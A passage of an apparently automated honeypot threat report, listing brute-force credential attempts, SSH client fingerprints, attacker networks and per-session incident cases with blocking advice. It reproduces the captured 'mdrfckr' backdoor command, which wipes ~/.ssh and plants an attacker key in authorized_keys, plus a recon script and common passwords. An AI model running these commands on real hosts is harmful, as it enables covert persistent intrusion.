| `test` | `54321` | `91.92.40.204` | 2026-07-06T06:13:12 |
| `test` | `654321` | `91.92.40.204` | 2026-07-06T06:13:55 |
| `test` | `P4$w0rd` | `91.92.40.204` | 2026-07-06T06:14:38 |
| `test` | `password` | `91.92.40.204` | 2026-07-06T06:15:20 |
| `root` | `000000` | `2.57.122.168` | 2026-07-06T06:15:23 |
| `test` | `qwerty` | `91.92.40.204` | 2026-07-06T06:16:03 |
| `test` | `test` | `91.92.40.204` | 2026-07-06T06:16:45 |
| `root` | `111111` | `2.57.122.168` | 2026-07-06T06:17:26 |
| `test` | `test1` | `91.92.40.204` | 2026-07-06T06:17:27 |
| `root` | `Pass@123456` | `185.242.3.195` | 2026-07-06T06:18:00 |
| `test` | `test123` | `91.92.40.204` | 2026-07-06T06:18:10 |
| `test1` | `1` | `91.92.40.204` | 2026-07-06T06:18:52 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-06T06:19:11 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-06T06:19:12 |
| `root` | `123` | `2.57.122.168` | 2026-07-06T06:19:31 |
| `test1` | `12` | `91.92.40.204` | 2026-07-06T06:19:34 |
| `ubuntu` | `admin1` | `45.198.224.120` | 2026-07-06T06:20:31 |
| `root` | `Et123456` | `10.0.0.73` | 2026-07-06T06:24:22 |
| `user` | `password123456789` | `10.0.0.73` | 2026-07-06T06:26:11 |
| `adminuser` | `adminuser` | `10.0.0.73` | 2026-07-06T06:30:01 |
| `adminuser` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T06:30:05 |
| `root` | `P@#$w0rd` | `45.198.224.120` | 2026-07-06T06:32:53 |
| `amir` | `amir123` | `165.154.205.128` | 2026-07-06T06:38:59 |
| `345gs5662d34` | `345gs5662d34` | `165.154.205.128` | 2026-07-06T06:39:03 |
| `amir` | `3245gs5662d34` | `165.154.205.128` | 2026-07-06T06:39:05 |
| `postgres` | `123` | `45.198.224.120` | 2026-07-06T06:45:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **796** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 320 |
| libssh | 77 |
| Paramiko (Python) | 4 |
| OpenSSH | 2 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 241 | 2 |
| `16443846184e...` | Generic scanner | 61 | 4 |
| `f555226df196...` | Mirai/variant | 56 | 22 |
| `eff4c24daffc...` | Modern SSH client | 9 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 241 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 61 | 4 | Generic scanner |
| `f555226df196...` | libssh | 56 | 22 | Mirai/variant |
| `95420f9d932d...` | libssh | 15 | 5 | — |
| `eff4c24daffc...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 2 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 239 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 20 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`, `91.92.40.204`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `110.93.224.226`, `101.126.54.245`, `8.243.73.162`, `180.76.105.69`, `104.236.53.110`, `38.224.49.7`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **83** |
| Unique ASNs | **46** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (381)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f22524947434

| Field | Detail |
|---|---|
| **Source IP** | `104.236.53[.]110` |
| **First Seen** | 2026-07-06 02:56 |
| **Last Seen** | 2026-07-06 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 02:56:54` | `cowrie.session.connect` |
| `2026-07-06 02:56:54` | `cowrie.client.version` |
| `2026-07-06 02:56:54` | `cowrie.client.kex` |
| `2026-07-06 02:56:54` | `cowrie.login.success` |
| `2026-07-06 02:56:55` | `cowrie.session.params` |
| `2026-07-06 02:56:55` | `cowrie.command.input` |
| `2026-07-06 02:56:55` | `cowrie.command.failed` |
| `2026-07-06 02:56:55` | `cowrie.log.closed` |
| `2026-07-06 02:56:55` | `cowrie.session.params` |
| `2026-07-06 02:56:55` | `cowrie.command.input` |
| `2026-07-06 02:56:55` | `cowrie.session.file_download` |
| `2026-07-06 02:56:55` | `cowrie.log.closed` |
| `2026-07-06 02:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.236.53[.]110` to AbuseIPDB if not already reported
- [ ] Block `104.236.53[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62fc80f45be2

| Field | Detail |
|---|---|
| **Source IP** | `104.236.53[.]110` |
| **First Seen** | 2026-07-06 02:56 |
| **Last Seen** | 2026-07-06 02:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 02:56:55` | `cowrie.session.connect` |
| `2026-07-06 02:56:55` | `cowrie.client.version` |
| `2026-07-06 02:56:55` | `cowrie.client.kex` |
| `2026-07-06 02:56:56` | `cowrie.login.success` |
| `2026-07-06 02:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.236.53[.]110` to AbuseIPDB if not already reported
- [ ] Block `104.236.53[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deb22ee0677d

| Field | Detail |
|---|---|
| **Source IP** | `104.236.53[.]110` |
| **First Seen** | 2026-07-06 02:56 |
| **Last Seen** | 2026-07-06 02:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 02:56:56` | `cowrie.session.connect` |
| `2026-07-06 02:56:56` | `cowrie.client.version` |
| `2026-07-06 02:56:56` | `cowrie.client.kex` |
| `2026-07-06 02:56:56` | `cowrie.login.success` |
| `2026-07-06 02:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.236.53[.]110` to AbuseIPDB if not already reported
- [ ] Block `104.236.53[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64d9538db48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 02:57 |
| **Last Seen** | 2026-07-06 02:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 02:57:15` | `cowrie.session.connect` |
| `2026-07-06 02:57:16` | `cowrie.client.version` |
| `2026-07-06 02:57:16` | `cowrie.client.kex` |
| `2026-07-06 02:57:17` | `cowrie.login.success` |
| `2026-07-06 02:57:19` | `cowrie.session.params` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.success` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:19` | `cowrie.command.input` |
| `2026-07-06 02:57:20` | `cowrie.log.closed` |
| `2026-07-06 02:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86199c32daf8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 02:58 |
| **Last Seen** | 2026-07-06 02:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 02:58:29` | `cowrie.session.connect` |
| `2026-07-06 02:58:29` | `cowrie.client.version` |
| `2026-07-06 02:58:29` | `cowrie.client.kex` |
| `2026-07-06 02:58:31` | `cowrie.login.success` |
| `2026-07-06 02:58:32` | `cowrie.session.params` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.success` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:32` | `cowrie.command.input` |
| `2026-07-06 02:58:33` | `cowrie.log.closed` |
| `2026-07-06 02:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b83c586784e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 02:59 |
| **Last Seen** | 2026-07-06 02:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 02:59:43` | `cowrie.session.connect` |
| `2026-07-06 02:59:43` | `cowrie.client.version` |
| `2026-07-06 02:59:43` | `cowrie.client.kex` |
| `2026-07-06 02:59:45` | `cowrie.login.success` |
| `2026-07-06 02:59:47` | `cowrie.session.params` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.success` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:47` | `cowrie.command.input` |
| `2026-07-06 02:59:48` | `cowrie.log.closed` |
| `2026-07-06 02:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbfbb1c30d7e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 03:00 |
| **Last Seen** | 2026-07-06 03:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:00:27` | `cowrie.session.connect` |
| `2026-07-06 03:00:27` | `cowrie.client.version` |
| `2026-07-06 03:00:27` | `cowrie.client.kex` |
| `2026-07-06 03:00:28` | `cowrie.login.success` |
| `2026-07-06 03:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431f07ef473f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 03:00 |
| **Last Seen** | 2026-07-06 03:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:00:28` | `cowrie.session.connect` |
| `2026-07-06 03:00:28` | `cowrie.client.version` |
| `2026-07-06 03:00:28` | `cowrie.client.kex` |
| `2026-07-06 03:00:28` | `cowrie.login.success` |
| `2026-07-06 03:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d9e5c427a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:00 |
| **Last Seen** | 2026-07-06 03:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:00:57` | `cowrie.session.connect` |
| `2026-07-06 03:00:57` | `cowrie.client.version` |
| `2026-07-06 03:00:57` | `cowrie.client.kex` |
| `2026-07-06 03:01:00` | `cowrie.login.success` |
| `2026-07-06 03:01:02` | `cowrie.session.params` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.success` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:02` | `cowrie.command.input` |
| `2026-07-06 03:01:03` | `cowrie.log.closed` |
| `2026-07-06 03:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb02aedce1b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:02 |
| **Last Seen** | 2026-07-06 03:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:02:13` | `cowrie.session.connect` |
| `2026-07-06 03:02:13` | `cowrie.client.version` |
| `2026-07-06 03:02:13` | `cowrie.client.kex` |
| `2026-07-06 03:02:15` | `cowrie.login.success` |
| `2026-07-06 03:02:17` | `cowrie.session.params` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.success` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.command.input` |
| `2026-07-06 03:02:17` | `cowrie.log.closed` |
| `2026-07-06 03:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac5c6cb46b65

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 03:04 |
| **Last Seen** | 2026-07-06 03:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:04:11` | `cowrie.session.connect` |
| `2026-07-06 03:04:13` | `cowrie.client.version` |
| `2026-07-06 03:04:13` | `cowrie.client.kex` |
| `2026-07-06 03:04:18` | `cowrie.login.success` |
| `2026-07-06 03:04:22` | `cowrie.session.params` |
| `2026-07-06 03:04:22` | `cowrie.command.input` |
| `2026-07-06 03:04:24` | `cowrie.log.closed` |
| `2026-07-06 03:04:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5de955fec7ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:04 |
| **Last Seen** | 2026-07-06 03:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:04:39` | `cowrie.session.connect` |
| `2026-07-06 03:04:39` | `cowrie.client.version` |
| `2026-07-06 03:04:40` | `cowrie.client.kex` |
| `2026-07-06 03:04:42` | `cowrie.login.success` |
| `2026-07-06 03:04:43` | `cowrie.session.params` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.success` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:43` | `cowrie.command.input` |
| `2026-07-06 03:04:44` | `cowrie.log.closed` |
| `2026-07-06 03:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf070f54fe63

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:05 |
| **Last Seen** | 2026-07-06 03:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
